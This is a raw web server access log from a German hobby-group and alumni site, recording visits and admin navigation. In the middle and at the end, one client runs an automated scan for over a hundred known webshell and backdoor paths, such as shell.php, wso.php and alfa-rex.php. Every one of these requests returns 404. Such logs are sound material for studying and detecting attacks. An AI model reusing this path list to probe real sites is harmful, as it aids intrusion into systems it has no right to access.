f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:52:32;/admin;/admin/hobby-category;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:52:37;/admin/hobby-category;/admin/hobby-category/new;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:52:45;/admin/hobby-category/new;/admin/hobby-category;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:52:46;/admin/hobby-category;/admin/hobby;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:52:47;/admin/hobby;/admin/hobby/new;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:53:01;/admin/hobby/new;/admin/hobby;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:53:05;/admin/hobby;/admin/hobby;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:54:05;/gruppen/hobby/journalismus;/gruppen;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:54:10;/gruppen;/gruppen/hobby/musikinstrumente-spielen;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 15:54:20;/gruppen/hobby/musikinstrumente-spielen;/gruppen/plausch/schulband-statt-fliessband;GET;200
42cc005cfe0e547cb5db66b394a4fd69cc0ee66aaaec78dc5923f16add4bcfe6;2025-11-07 15:54:23;;/;GET;200
18465003bf08a02c148c944121bcfffef736ca74d9737b3448024c28f0896ed6;2025-11-07 15:55:25;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
3f594231ac9ac14aca965dfb292bca02a19e8714f935ccb862b705dacaafd967;2025-11-07 15:55:41;;/;GET;200
d0a0e926dbd1bebe304e465cb407ed6babfe146cc50357b0c3dfe75f8fa93b8a;2025-11-07 15:59:48;;/perso;GET;404
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:05:24;/gruppen/plausch/schulband-statt-fliessband;/gruppen;GET;200
506593679514de869aeb88e3932b2973405f279e244b7d17ae7d3231882cb753;2025-11-07 16:08:01;;/admin/config.php;GET;404
6ca04099a0d612514779011a6c85df05740aa0f541385c233d7e8fd3bb69d50d;2025-11-07 16:08:51;;/favicon.192x192.png;GET;404
3ba70cd48dd81f25e5ee7e0d0d9576d339dbcd25a52bdc5d456ce9c9b3c150d6;2025-11-07 16:11:24;;/gruppen/hobby/yoga-und-meditation;GET;200
a06159e3ddb2bb424e9436abdffcf5ae1a6d6c3943311941aeddd6589e0335f6;2025-11-07 16:14:46;;/;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:23;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:24;;/shoha.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:25;;/system.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:26;;/shell.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:26;;/wp.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:27;;/m.php;GET;404
fba0c8c4e09a2663180710c69ad49b144b462ff821e61d12afac3216a21c9c61;2025-11-07 16:15:27;/;/;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:28;;/sto.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:29;;/db.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:30;;/222.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:31;;/o.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:31;;/an.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:32;;/gmo.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:33;;/file.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:34;;/wp-content/upgrade/f35.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:35;;/index/function.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:35;;/wp-includes/Text/Diff/sts.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:36;;/wp-admin/css/colour.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:37;;/wp-includes/widgets/past.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:38;;/wp-content/upgrade/20ojy.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:39;;/wp-includes/block-bindings.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:39;;/wp-admin/css/colors/sunrise/%20colors.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:40;;/.well-known/file.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:41;;/.well-known/fm.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:42;;/wp-admin/js/prayer_intentions.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:43;;/vendor/wp-login.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:43;;/system.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:44;;/wp-admin/images/lint-branch.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:45;;/wp-content/uploads/layout.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:46;;/wp-admin/images/wp-signup.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:47;;/wp-admin/images/click.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:47;;/wp-admin/css/colors/blue/end.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:48;;/uploat.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:49;;/wp-includes/widgets/buy.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:50;;/wp-includes/fonts/about.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:51;;/uploxe.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:52;;/wp-includes/kn18l3.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:52;;/images/class-config.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:53;;/wp-includes/Requests/Cookie/alfa-rex.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:54;;/.well-known/log.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:55;;/wp-content/uploads/credits.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:56;;/wp-includes/orvxmailer.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:56;;/wp-admin/includes/lint-branch.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:57;;/wp-admin/fw.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:58;;/.well-known/pki-validation/404.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:15:59;;/files/files_uploader.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:00;;/wp-content/plugins/pwnd-1/pwnd.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:00;;/wp-includes/js/jcrop/Jcrop.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:01;;/wp-admin/includes/admin-ajax.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:02;;/wp-includes/js/thickbox/alfa-rex.php8;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:03;;/wp-admin/css/colors/soYgFVi.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:04;;/wp-admin/css/colors/midnight/YRFLoxBi.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:04;;/wp-includes/ID3/colour.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:05;;/wp-includes/js/dist/alfa-rex.php7;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:06;;/wp-admin/js/widgets/wp-kaori.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:07;;/.bod/.ll/ss.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:08;;/wp-includes/Text/about.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:08;;/tentang_rmol.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:09;;/uploads/bigdump.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:10;;/file.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:11;;/wp-admin/includes/go.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:12;;/k.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:13;;/wp-admin/includes/plugin-wp.php;GET;404
7ad0dd2535491e5c5baa39b67366d9bb60c916552c58c140e3788b9b192c4b6b;2025-11-07 16:16:13;;/;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:13;;/wp-includes/wp-class-db.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:14;;/wp-includes/widgets/index.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:15;;/wp-includes/sitemaps/white.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:16;;/wp-admin/includes/pt.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:17;;/wp-admin/js/widgets/pepe.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:17;;/wp-admin/kOns8dgHcTK.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:18;;/1index.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:19;;/wp-login.php;GET;404
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:16:20;/gruppen/plausch/schulband-statt-fliessband;/gruppen;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:20;;/info.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:21;;/wp-content/themes/xss/about.php7;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:21;;/wp-content/plugins/azra-tn/wso.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:22;;/wp-includes/davoeqyv.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:23;;/wp-content/languages/ru_RU_lite.mo.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:24;;/uploadx.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:25;;/wp-includes/sitemaps/providers/file.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:25;;/oxvrws.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:26;;/wp-content/upgrade/rk2.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:27;;/wp-admin/images/browser.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:28;;/wp-admin/lRGuqAwmnyh.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:29;;/wp-includes/Text/Diff/index.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:29;;/wp-includes/class-wordpress-license.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:30;;/wp-load.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:31;;/wp-includes/widgets/goat.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:32;;/wp-admin/maint/1wx.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:33;;/wp-admin/css/colors/coffee/admin.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:34;;/wp-admin/css/colors/akVyV.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:34;;/xl2023.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:35;;/dropdown.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:36;;/wp-admin/css/colors/blue/file.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:37;;/shell20211028.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:38;;/wp-includes/as.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:38;;/wp-includes/Text/lzmelu.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:39;;/.well-known/autoconfig/atomlib.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:40;;/wp-includes/class-wp-more.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:41;;/.well-known/oasnykdf.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:42;;/ws.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:42;;/wp-includes/widgets/system.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:43;;/wp-content/plugins/cp-pro/js.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:44;;/wp-includes/css/error_log.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:45;;/wp-content/plugins/pwnd/pwnd.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:46;;/wp-includes/pomo/entry-view.php;GET;404
09d7bdc53869d4e84c6c656f5f633adc008a3094873f51716048a4ebefe5c81f;2025-11-07 16:16:46;;/;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:46;;/wp-includes/css/about.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:47;;/wp-admin/includes/mango.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:48;;/images/up.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:49;;/wp-includes/ID3/about.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:50;;/wp-includes/Requests/about.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:50;;/wp-admin/maint/singlex.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:51;;/wp-admin/css/colors/BbiNip.php;GET;404
e31f39a3cb278e0382e67f775a3d39850b816d09c9c312d2a59eef565b820539;2025-11-07 16:16:53;;/;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:53;;/wp-admin/8T1hs2AP4ox.php;GET;404
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:16:53;/gruppen;/admin;GET;500
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:54;;/wp-admin/js/widgets/gool.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:55;;/wp-content/themes/sketch/404.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:56;;/wp-admin/css/hehe.php;GET;404
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:16:57;/admin;/profile;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:57;;/403.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:58;;/wp-admin/js/lint-branch.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:58;;/wp-admin/maint/wp-is.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:16:59;;/wp-includes/rollback-handler.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:00;;/wp-admin/js/hehe.php;GET;404
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:17:00;/profile;/admin;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:01;;/wp-content/index.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:02;;/wp-includes/post-template-url.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:03;;/wp-includes/js/client-dashboard.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:03;;/wp-admin/maint/cong.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:04;;/inputs.php;GET;404
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:17:05;/admin;/admin/hobby;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:05;;/bala.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:06;;/wp-content/plugins/index.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:07;;/.well-known/ae.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:07;;/function/function.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:08;;/wp-includes/cqhlsvmp.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:09;;/wp-admin/maint/pagea.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:10;;/uplozyu.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:11;;/wp-admin/maint/wp-login.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:11;;/wp-includes/ID3/Auth.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:12;;/ropyx.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:13;;/wp-includes/blocks/CdHjunpTsr.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:14;;/wp-head.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:15;;/wp-includes/Text/about.php7;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:15;;/fwe.php;GET;404
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:17:16;/admin/hobby;/admin/hobby?query=veranstaltung;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:16;;/.well-known/nam.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:17:17;;/2.php;GET;404
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:17:20;/admin/hobby?query=veranstaltung;/admin/hobby?query=abschluss;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:17:22;/admin/hobby?query=abschluss;/admin/hobby/55/edit?query=abschluss;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:17:50;/admin/hobby/55/edit?query=abschluss;/admin/hobby?query=abschluss;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-07 16:18:00;/profile;/profile/update;GET;200
2991f7516e3075426c40d794b8b4774d854bf68f7bce2606ca030686a3304420;2025-11-07 16:18:04;/;/profile/update;GET;302
2991f7516e3075426c40d794b8b4774d854bf68f7bce2606ca030686a3304420;2025-11-07 16:18:04;/;/login;GET;200
564192c76ea7339d96b8522a128b9059e197a7b001266d74523476bc4e725d76;2025-11-07 16:18:15;;/gruppen/hobby/social-media-management;GET;200
7921a559ef517b5da2bdb9b8fd33c6c67854eb0ce6d1a739c9a097f8d35d15e1;2025-11-07 16:19:08;;/;GET;200
03db25e8e57c2d694090b1d250862626844e01753f63bfb02286aee2a8880e63;2025-11-07 16:28:06;;/gruppen/hobby/diy-projekte;GET;200
eb4384ef7bc86e2ea34bb932cbd83e75cb04ae82375a899d76993379d67852ad;2025-11-07 16:30:01;;/;GET;200
54390a51721b97387a450fe658e36a13a740a119e45ef58d0715e82c092a5466;2025-11-07 16:39:01;;/;GET;200
74834f7e9b08a093cfcc0fdf93c3c3715f5cb4069f3a88401c2ed1b065002a1b;2025-11-07 16:39:17;;/;GET;200
aac89ae21eb7a5599b6cc1d28354eee4e6784c57598b6ca538436257231993dc;2025-11-07 16:40:08;;/personen/alumni/details/benjamin-voigt;GET;200
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:34;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:35;;/shoha.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:36;;/system.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:37;;/shell.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:38;;/wp.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:39;;/m.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:40;;/sto.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:40;;/db.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:41;;/222.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:42;;/o.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:43;;/an.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:44;;/gmo.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:45;;/file.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:45;;/wp-content/upgrade/f35.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:46;;/index/function.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:47;;/wp-includes/Text/Diff/sts.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:48;;/wp-admin/css/colour.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:49;;/wp-includes/widgets/past.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:50;;/wp-content/upgrade/20ojy.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:50;;/wp-includes/block-bindings.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:51;;/wp-admin/css/colors/sunrise/%20colors.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:52;;/.well-known/file.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:53;;/.well-known/fm.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:54;;/wp-admin/js/prayer_intentions.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:54;;/vendor/wp-login.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:55;;/system.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:56;;/wp-admin/images/lint-branch.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:57;;/wp-content/uploads/layout.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:58;;/wp-admin/images/wp-signup.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:58;;/wp-admin/images/click.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:44:59;;/wp-admin/css/colors/blue/end.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:45:00;;/uploat.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:45:01;;/wp-includes/widgets/buy.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:45:02;;/wp-includes/fonts/about.php;GET;404
406d5e09c2bf327265da27c065316715b83790a686463748c1152cde546da9f8;2025-11-07 16:45:02;;/uploxe.php;GET;404
